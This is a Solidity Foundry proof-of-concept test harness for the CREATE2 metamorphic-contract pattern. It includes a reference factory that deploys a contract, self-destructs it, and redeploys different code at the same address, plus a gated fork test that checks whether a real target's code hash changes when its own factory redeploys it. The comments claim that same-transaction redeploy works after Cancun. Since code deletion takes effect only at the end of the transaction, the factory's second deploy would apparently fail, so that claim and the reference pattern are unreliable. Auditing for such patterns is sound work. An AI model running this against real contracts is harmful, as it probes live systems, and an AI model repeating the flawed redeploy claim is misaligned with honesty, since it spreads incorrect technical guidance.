// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- CREATE2 metamorphic redeploy (same address, new code)
/// @notice A contract deployed via CREATE2 at a deterministic address can
///         be REPLACED with different code at the SAME address -- IF it
///         selfdestructs in the same transaction as its creation (post-
///         Cancun / EIP-6780, selfdestruct only deletes code same-tx).
///         Anyone trusting "this address is that code" is trusting a
///         mutable binding.
/// @dev FORK-ONLY. Run via scripts/run-fork-poc.sh. NOTE: the classic
///      multi-tx metamorphic (deploy, later selfdestruct, redeploy) is
///      DEAD post-Cancun; the same-tx factory path is the live variant.
///      The factory/impl contracts below are that reference pattern.
///      GATE: the verdict must come from the TARGET's own deployment
///      path, never from these template-owned contracts -- a template
///      that redeploys its own factory proves the pattern exists, not
///      that POC_TARGET is metamorphic. TODO: set TARGET_FACTORY (the
///      factory that deployed POC_TARGET via CREATE2, exposing a
///      redeploy(bytes32) -> address entry point with the semantics
///      below; adapt the interface if the real factory's differs) and
///      TARGET_SALT (the salt POC_TARGET was deployed with), from the
///      target's deployment records. As shipped (both zero) the test
///      aborts -- no pass is reachable from template-owned contracts.

contract ImplV1 {
    function version() external pure returns (uint256) {
        return 1;
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract ImplV2 {
    function version() external pure returns (uint256) {
        return 2;
    }
}

contract MetamorphicFactory {
    // Deploys V1, selfdestructs it IN THE SAME TX (code deleted), then
    // deploys V2 at the SAME CREATE2 address with different code.
    function redeploy(bytes32 salt) external returns (address addr) {
        bytes memory codeV1 = type(ImplV1).creationCode;
        bytes memory codeV2 = type(ImplV2).creationCode;
        assembly {
            addr := create2(0, add(codeV1, 0x20), mload(codeV1), salt)
        }
        require(addr != address(0), "V1 deploy failed");
        ImplV1(addr).kill();
        assembly {
            addr := create2(0, add(codeV2, 0x20), mload(codeV2), salt)
        }
        require(addr != address(0), "V2 redeploy failed");
    }
}

/// The target factory's redeploy entry point (the reference pattern
/// above). Adapt to the real factory's ABI when it differs.
interface IRedeployFactory {
    function redeploy(bytes32 salt) external returns (address);
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: the factory that deployed POC_TARGET via CREATE2 + its salt.
    address public constant TARGET_FACTORY = address(0);
    bytes32 public constant TARGET_SALT = bytes32(0);

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(
            TARGET_FACTORY != address(0),
            "41-create2: TARGET_FACTORY not supplied -- this harness cannot judge a target from template-owned contracts; set TARGET_FACTORY + TARGET_SALT to the factory and salt that deployed POC_TARGET (adaptation required)"
        );

        address tgt = target;
        bytes32 codeBefore;
        assembly {
            codeBefore := extcodehash(tgt)
        }

        // Drive the TARGET's own factory: it must land back on POC_TARGET
        // (the supplied factory + salt really are its deployment path) and
        // the code at POC_TARGET must change across the redeploy.
        address redeployed = IRedeployFactory(TARGET_FACTORY).redeploy(TARGET_SALT);
        require(
            redeployed == target,
            "41-create2: factory redeploy did not land on POC_TARGET -- the supplied factory/salt are not the target's deployment path"
        );

        bytes32 codeAfter;
        assembly {
            codeAfter := extcodehash(tgt)
        }
        console.log("target code hash before:");
        console.logBytes32(codeBefore);
        console.log("target code hash after:");
        console.logBytes32(codeAfter);
        assertTrue(
            codeAfter != codeBefore,
            "exploit did not reproduce: target code unchanged after its own factory redeployed it"
        );
    }
}
